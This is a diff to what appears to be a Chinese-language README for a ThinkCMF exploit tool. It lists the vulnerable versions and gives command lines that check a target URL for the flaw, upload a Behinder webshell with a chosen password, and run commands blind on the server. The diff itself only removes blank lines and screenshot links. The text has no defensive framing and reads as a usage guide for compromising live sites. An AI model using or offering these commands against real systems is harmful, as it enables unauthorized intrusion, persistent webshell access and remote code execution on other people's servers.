@@ -7,15 +7,10 @@
 # 适用版本：
 
 ThinkCMF X1.6.0
-
 ThinkCMF X2.1.0
-
 ThinkCMF X2.2.0
-
 ThinkCMF X2.2.1
-
 ThinkCMF X2.2.2
-
 ThinkCMF X2.2.3
 
 ThinkCMF源码下载地址https://gitee.com/thinkcmf/ThinkCMFX/releases
@@ -30,20 +25,10 @@ python thinkcmf_exp.py -h
 
 python thinkcmf_exp.py -u http://yourURL/
 
-![](C:\Users\85793\Music\漏洞测试工具\ThinkCMF任意内容包含\检测漏洞.png)
-
 ### 上传冰蝎马
 
 python thinkcmf_exp.py -u http://yourURL/ -p yourPassword
 
-![上传冰蝎](C:\Users\85793\Music\漏洞测试工具\ThinkCMF任意内容包含\上传冰蝎.png)
-
-<img src="C:\Users\85793\Music\漏洞测试工具\ThinkCMF任意内容包含\上传成功.png" alt="上传成功" style="zoom:50%;" />
-
 ### 无回显命令执行
 
 python thinkcmf_exp.py -u http://yourURL/ -c yourCommand
-
-![命令执行](C:\Users\85793\Music\漏洞测试工具\ThinkCMF任意内容包含\命令执行.png)
-
-<img src="C:\Users\85793\Music\漏洞测试工具\ThinkCMF任意内容包含\执行成功.png" alt="执行成功" style="zoom:50%;" />
